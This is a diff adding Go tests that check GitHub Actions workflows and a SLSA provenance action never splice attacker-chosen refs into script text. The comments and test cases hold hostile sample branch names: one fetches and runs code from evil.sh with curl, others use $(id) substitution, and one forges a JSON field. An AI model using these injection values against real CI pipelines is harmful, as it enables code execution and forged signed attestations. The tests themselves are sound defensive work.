@@ -16,8 +16,11 @@ package uat
 
 import (
 	_ "crypto/sha256" // Register SHA-256 for github.com/opencontainers/go-digest.
+	"encoding/json"
 	"fmt"
+	"maps"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"slices"
 	"strings"
@@ -43,7 +46,58 @@ const (
 	// would be canceled at 360m and the cluster leaked. See uat-gcp.yaml's
 	// timeout budget comment and #2066/#2067.
 	githubHostedJobCapMinutes = 360
+
+	// actionsDir holds the repo's composite actions. Their schema differs from a
+	// workflow's: steps live under runs.steps, not under a job.
+	actionsDir = "../../.github/actions"
+	// slsaPredicateAction writes the SLSA Build Provenance predicate that cosign
+	// attest-blob signs, so any value spliced into its script text ends up inside
+	// a signed attestation.
+	slsaPredicateAction = "generate-slsa-predicate/action.yml"
+	// slsaPredicateMarker is the file that step writes. Locating the step by the
+	// artifact it produces survives a rename of the step.
+	slsaPredicateMarker = "slsa-predicate.json"
+
+	// expressionOpen and expressionClose delimit an Actions expression. The
+	// runner replaces the whole span with its value in the script TEXT, before
+	// bash parses the script.
+	expressionOpen  = "${{"
+	expressionClose = "}}"
+
+	// eventContextPrefix covers github.event.*, the webhook payload, which
+	// carries pull request titles, branch names and commit messages verbatim.
+	eventContextPrefix = "github.event."
+
+	// Inputs for the rendered predicate. Only their distinguishability in the
+	// emitted JSON matters.
+	slsaPredicateRepository   = "NVIDIA/aicr"
+	slsaPredicateSHA          = "4f264720bf67d676189e39af6079cb781d4918ee"
+	slsaPredicateRunID        = "17600000001"
+	slsaPredicateWorkflowFile = "on-tag.yaml"
 )
+
+// refBearingUATWorkflows are the UAT lanes whose Test Summary step reports the
+// branch under test. They are checked together because the lanes are written
+// from one another, so a shape travels between them by copy: uat-kind-sim
+// inherited the injectable form from uat-kind, and uat-aws and uat-gcp carried
+// it independently until 4f264720.
+var refBearingUATWorkflows = []string{
+	"uat-kind-sim.yaml",
+	"uat-kind.yaml",
+	"uat-aws.yaml",
+	"uat-gcp.yaml",
+	"uat-azure.yaml",
+}
+
+// attackerChosenContexts name the Actions contexts whose CONTENT is chosen by
+// whoever pushes the branch or opens the pull request, and which therefore must
+// never be substituted into a script's text.
+var attackerChosenContexts = []string{
+	"github.ref",
+	"github.ref_name",
+	"github.head_ref",
+	"github.base_ref",
+}
 
 type actuatorExpectation struct {
 	name       string
@@ -636,6 +690,154 @@ func TestActiveDockerRunMatches(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			if got := activeDockerRunMatches(tt.run, pinnedGKERef+" apply", environment); got != tt.want {
 				t.Fatalf("activeDockerRunMatches() = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
+
+// TestUATRunBlocksNeverSpliceAttackerChosenRefs pins the fix that uat-azure
+// carried first, uat-kind-sim took in 0884716a and the three cloud lanes took in
+// 4f264720. Actions substitutes an expression into the script text before bash
+// parses it, so a value whose CONTENT an outsider chooses is executed rather than
+// printed. Git accepts such names: `git check-ref-format --branch 'feat/a$(id)b'`
+// exits 0, and ${IFS} sidesteps the no-space rule, so
+// `feat/x$(curl${IFS}evil.sh|sh)y` is a valid branch name.
+//
+// The assertion is on the context PATH an expression references, not on any
+// wording of the shell around it, so moving the line to another step, renaming
+// the step, or reformatting the printf does not evade it.
+func TestUATRunBlocksNeverSpliceAttackerChosenRefs(t *testing.T) {
+	for _, file := range refBearingUATWorkflows {
+		t.Run(file, func(t *testing.T) {
+			workflow := decodeWorkflow(t, file)
+			runBlocks := 0
+			routedThroughEnv := 0
+			for jobName, job := range workflow.Jobs {
+				for _, step := range job.Steps {
+					derived := attackerChosenEnvKeys(workflow.Env, job.Env, step.Env)
+					routedThroughEnv += len(derived)
+					if strings.TrimSpace(step.Run) == "" {
+						continue
+					}
+					runBlocks++
+					for _, expression := range actionsExpressions(step.Run) {
+						for _, context := range expressionContexts(expression) {
+							if !isAttackerChosenContext(context, derived) {
+								continue
+							}
+							t.Errorf("job %q step %q splices ${{ %s }} into its run block; "+
+								"Actions substitutes the expression into the script text before bash "+
+								"parses it, so a branch name carrying $( ) executes. Put the value in "+
+								"the step's env: and read it back as $VAR.",
+								jobName, step.Name, strings.TrimSpace(expression))
+						}
+					}
+				}
+			}
+			// Without these the guard would pass vacuously on a workflow this test
+			// can no longer see into (renamed file, changed schema, empty decode).
+			if runBlocks == 0 {
+				t.Fatalf("%s decoded to zero run blocks; the guard cannot be reading the lane", file)
+			}
+			if routedThroughEnv == 0 {
+				t.Errorf("%s routes no attacker-chosen value through env:; the lane either lost the "+
+					"summary step that reports the branch or reverted to splicing it inline", file)
+			}
+		})
+	}
+}
+
+// TestSLSAPredicateActionTakesEveryValueFromEnv holds the shape the predicate
+// action's safety rests on. Its heredoc delimiter is unquoted on purpose, so the
+// script can read $VAR back from the environment; that only stays safe while no
+// ${{ }} is substituted into the script text. Asserting "no expression at all"
+// rather than naming github.ref keeps the guard true for github.repository,
+// inputs.workflow_file and any context added later.
+func TestSLSAPredicateActionTakesEveryValueFromEnv(t *testing.T) {
+	step := slsaPredicateStep(t)
+
+	for _, expression := range actionsExpressions(step.Run) {
+		t.Errorf("the predicate script splices ${{ %s }} into its own text; every value must arrive "+
+			"through env:, because this script's output is signed as a SLSA attestation",
+			strings.TrimSpace(expression))
+	}
+
+	derived := attackerChosenEnvKeys(step.Env)
+	if len(derived) == 0 {
+		t.Fatalf("no env: entry of the predicate step carries an attacker-chosen context; "+
+			"env keys present: %v", slices.Sorted(maps.Keys(step.Env)))
+	}
+	// Coarse on purpose: one surviving mention satisfies it, so a script that
+	// reads the variable in one field and hardcodes another still passes here.
+	// TestSLSAPredicateRecordsHostileValuesVerbatim is what catches that, by
+	// comparing every rendered field against the ref it was given.
+	for name := range derived {
+		if !strings.Contains(step.Run, name) {
+			t.Errorf("env %q holds an attacker-chosen context but the script never reads it back; "+
+				"a value that reaches the predicate by another route is not covered by this guard", name)
+		}
+	}
+}
+
+// TestSLSAPredicateRecordsHostileValuesVerbatim runs the action's own script,
+// rendered the way the runner renders it: expressions are substituted into the
+// env values and into the run text alike, then bash executes the result. It is
+// the behavioral counterpart to the structural guard above, and it fails on the
+// pre-fix shape for both reasons that shape was wrong. The ref carrying $( )
+// catches execution; the ref carrying a double quote catches JSON forgery, which
+// a parse check alone would miss because the forged document parses.
+func TestSLSAPredicateRecordsHostileValuesVerbatim(t *testing.T) {
+	for _, tool := range []string{"bash", "jq"} {
+		if _, err := exec.LookPath(tool); err != nil {
+			t.Skipf("%s not available on PATH (the predicate script shells out to it)", tool)
+		}
+	}
+	step := slsaPredicateStep(t)
+
+	tests := []struct {
+		name string
+		ref  string
+	}{
+		{"ordinary branch", "refs/heads/main"},
+		// `git check-ref-format --branch 'feat/x$(curl${IFS}evil.sh|sh)y'` exits 0.
+		{"command substitution", "refs/heads/feat/x$(id -un)y"},
+		{"backtick substitution", "refs/heads/feat/a`id`b"},
+		// `git check-ref-format --branch 'feat/a"b'` exits 0, so a ref can close
+		// the JSON string it is written into and graft on a field of its own.
+		{"json string terminator", `refs/heads/feat/a", "malicious": "x`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			predicate := renderSLSAPredicate(t, step, tt.ref)
+
+			var document struct {
+				BuildDefinition struct {
+					ExternalParameters   map[string]string `json:"externalParameters"`
+					ResolvedDependencies []struct {
+						URI string `json:"uri"`
+					} `json:"resolvedDependencies"`
+				} `json:"buildDefinition"`
+			}
+			if err := json.Unmarshal(predicate, &document); err != nil {
+				t.Fatalf("the emitted predicate is not valid JSON: %v\n%s", err, predicate)
+			}
+
+			parameters := document.BuildDefinition.ExternalParameters
+			if got := parameters["ref"]; got != tt.ref {
+				t.Errorf("externalParameters.ref = %q, want %q; the ref was altered on the way into "+
+					"the attestation", got, tt.ref)
+			}
+			if got := slices.Sorted(maps.Keys(parameters)); !slices.Equal(got, []string{"ref", "repository"}) {
+				t.Errorf("externalParameters keys = %v, want [ref repository]; the ref grafted a field "+
+					"onto the attestation", got)
+			}
+			if len(document.BuildDefinition.ResolvedDependencies) != 1 {
+				t.Fatalf("resolvedDependencies has %d entries, want 1",
+					len(document.BuildDefinition.ResolvedDependencies))
+			}
+			wantURI := "git+https://github.com/" + slsaPredicateRepository + "@" + tt.ref
+			if got := document.BuildDefinition.ResolvedDependencies[0].URI; got != wantURI {
+				t.Errorf("resolvedDependencies[0].uri = %q, want %q", got, wantURI)
 			}
 		})
 	}
@@ -1809,4 +2011,244 @@ func walkStringScalars(node *yaml.Node, visit func(string)) {
 	for _, child := range node.Content {
 		walkStringScalars(child, visit)
 	}
+}
+
+// slsaPredicateStep returns the single step of the SLSA predicate action that
+// writes the predicate file.
+func slsaPredicateStep(t *testing.T) workflowStep {
+	t.Helper()
+	path := filepath.Clean(filepath.Join(actionsDir, slsaPredicateAction))
+	data, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatalf("read %s: %v", path, err)
+	}
+	var action struct {
+		Runs struct {
+			Steps []workflowStep `yaml:"steps"`
+		} `yaml:"runs"`
+	}
+	if err := yaml.Unmarshal(data, &action); err != nil {
+		t.Fatalf("parse %s: %v", path, err)
+	}
+	matches := make([]workflowStep, 0, 1)
+	for _, step := range action.Runs.Steps {
+		if strings.Contains(step.Run, slsaPredicateMarker) {
+			matches = append(matches, step)
+		}
+	}
+	if len(matches) != 1 {
+		t.Fatalf("found %d steps writing %q in %s, want exactly one",
+			len(matches), slsaPredicateMarker, path)
+	}
+	return matches[0]
+}
+
+// renderSLSAPredicate reproduces what the runner does to the step: substitute
+// every ${{ }} into the env values and into the run text, export the env, and
+// execute the script. Only the part of the script that terminates the predicate
+// heredoc is run; the tail fetches a Sigstore signing config over the network.
+func renderSLSAPredicate(t *testing.T, step workflowStep, ref string) []byte {
+	t.Helper()
+	values := map[string]string{
+		"github.repository":    slsaPredicateRepository,
+		"github.ref":           ref,
+		"github.sha":           slsaPredicateSHA,
+		"github.run_id":        slsaPredicateRunID,
+		"inputs.workflow_file": slsaPredicateWorkflowFile,
+	}
+
+	directory := t.TempDir()
+	environment := append(os.Environ(), "RUNNER_TEMP="+directory)
+	for name, value := range step.Env {
+		environment = append(environment, name+"="+substituteExpressions(t, value, values))
+	}
+
+	script, err := heredocTerminatedPrefix(substituteExpressions(t, step.Run, values))
+	if err != nil {
+		t.Fatalf("locate the predicate heredoc: %v", err)
+	}
+	scriptPath := filepath.Join(directory, "predicate.sh")
+	if writeErr := os.WriteFile(scriptPath, []byte(script), 0o600); writeErr != nil {
+		t.Fatalf("write the rendered script: %v", writeErr)
+	}
+
+	command := exec.Command("bash", scriptPath)
+	command.Env = environment
+	if output, runErr := command.CombinedOutput(); runErr != nil {
+		t.Fatalf("run the rendered predicate script: %v\n%s", runErr, output)
+	}
+	predicate, err := os.ReadFile(filepath.Join(directory, "slsa-predicate.json"))
+	if err != nil {
+		t.Fatalf("read the emitted predicate: %v", err)
+	}
+	return predicate
+}
+
+// substituteExpressions replaces every ${{ }} with its test value, the textual
+// substitution the runner performs before bash parses the script. An expression
+// with no test value is fatal rather than skipped, so a context added later
+// cannot quietly drop out of the rendered script.
+func substituteExpressions(t *testing.T, text string, values map[string]string) string {
+	t.Helper()
+	var rendered strings.Builder
+	cursor := 0
+	for {
+		start := strings.Index(text[cursor:], expressionOpen)
+		if start < 0 {
+			rendered.WriteString(text[cursor:])
+			return rendered.String()
+		}
+		start += cursor
+		end := strings.Index(text[start+len(expressionOpen):], expressionClose)
+		if end < 0 {
+			t.Fatalf("unterminated expression in %q", text[start:])
+		}
+		body := strings.TrimSpace(text[start+len(expressionOpen) : start+len(expressionOpen)+end])
+		value, known := values[body]
+		if !known {
+			t.Fatalf("expression ${{ %s }} has no test value; add one so the rendered script "+
+				"stays faithful to what the runner produces", body)
+		}
+		rendered.WriteString(text[cursor:start])
+		rendered.WriteString(value)
+		cursor = start + len(expressionOpen) + end + len(expressionClose)
+	}
+}
+
+// heredocTerminatedPrefix returns the leading part of a script up to and
+// including the line that closes its first heredoc. Splitting on the heredoc
+// structure rather than on a chosen line of text means the boundary survives an
+// edit to the script's tail.
+func heredocTerminatedPrefix(script string) (string, error) {
+	lines := strings.Split(script, "\n")
+	pending := make([]shellHeredoc, 0)
+	opened := false
+	for number, raw := range lines {
+		if len(pending) > 0 {
+			candidate := raw
+			if pending[0].stripTabs {
+				candidate = strings.TrimLeft(candidate, "\t")
+			}
+			if candidate == pending[0].delimiter {
+				pending = pending[1:]
+			}
+			if len(pending) == 0 {
+				return strings.Join(lines[:number+1], "\n") + "\n", nil
+			}
+			continue
+		}
+		line, err := stripShellComment(raw)
+		if err != nil {
+			return "", fmt.Errorf("line %d: %w", number+1, err)
+		}
+		heredocs := shellHeredocs(line)
+		if len(heredocs) > 0 {
+			opened = true
+		}
+		pending = append(pending, heredocs...)
+	}
+	if opened {
+		return "", fmt.Errorf("unterminated heredoc %q", pending[0].delimiter)
+	}
+	return "", fmt.Errorf("the script opens no heredoc")
+}
+
+// actionsExpressions returns the body of every ${{ }} in text. The closing
+// delimiter is matched as a pair, so an expression containing a format()
+// placeholder such as '{0}' is returned whole rather than cut at its first brace.
+func actionsExpressions(text string) []string {
+	expressions := make([]string, 0)
+	cursor := 0
+	for {
+		start := strings.Index(text[cursor:], expressionOpen)
+		if start < 0 {
+			return expressions
+		}
+		start += cursor
+		end := strings.Index(text[start+len(expressionOpen):], expressionClose)
+		if end < 0 {
+			return expressions
+		}
+		expressions = append(expressions, text[start+len(expressionOpen):start+len(expressionOpen)+end])
+		cursor = start + len(expressionOpen) + end + len(expressionClose)
+	}
+}
+
+// expressionContexts returns the dotted context paths an Actions expression
+// references. Single-quoted literals are skipped so a format() template does not
+// contribute its own text as an identifier.
+func expressionContexts(expression string) []string {
+	contexts := make([]string, 0)
+	var current strings.Builder
+	quoted := false
+	flush := func() {
+		if path := strings.Trim(current.String(), "."); path != "" {
+			contexts = append(contexts, path)
+		}
+		current.Reset()
+	}
+	for index := 0; index < len(expression); index++ {
+		character := expression[index]
+		if quoted {
+			if character == '\'' {
+				quoted = false
+			}
+			continue
+		}
+		switch {
+		case character == '\'':
+			flush()
+			quoted = true
+		case character == '.' || character == '_' || character == '-' ||
+			character >= 'a' && character <= 'z' ||
+			character >= 'A' && character <= 'Z' ||
+			character >= '0' && character <= '9':
+			current.WriteByte(character)
+		default:
+			flush()
+		}
+	}
+	flush()
+	return contexts
+}
+
+// isAttackerChosenContext reports whether an expression referencing context
+// carries text an outsider chooses. github.repository and github.sha are
+// deliberately absent: GitHub constrains a repository name to [A-Za-z0-9._-]
+// and a sha to hex, so neither can carry a shell metacharacter. envKeys extends
+// the judgement one hop, to a workflow/job/step env entry that is itself defined
+// from such a context, which is the shape a partial revert would take.
+func isAttackerChosenContext(context string, envKeys map[string]bool) bool {
+	if slices.Contains(attackerChosenContexts, context) {
+		return true
+	}
+	if context == strings.TrimSuffix(eventContextPrefix, ".") ||
+		strings.HasPrefix(context, eventContextPrefix) {
+
+		return true
+	}
+	name, viaEnv := strings.CutPrefix(context, "env.")
+	return viaEnv && envKeys[name]
+}
+
+// attackerChosenEnvKeys returns the names of the env entries defined from an
+// attacker-chosen context. Defining one is the CORRECT shape: the value is
+// exported, and a shell reading it back as $VAR expands it without re-scanning
+// it for command substitution.
+func attackerChosenEnvKeys(environments ...map[string]string) map[string]bool {
+	keys := make(map[string]bool)
+	for _, environment := range environments {
+		for name, value := range environment {
+			for _, expression := range actionsExpressions(value) {
+				for _, context := range expressionContexts(expression) {
+					if slices.Contains(attackerChosenContexts, context) ||
+						strings.HasPrefix(context, eventContextPrefix) {
+
+						keys[name] = true
+					}
+				}
+			}
+		}
+	}
+	return keys
 }
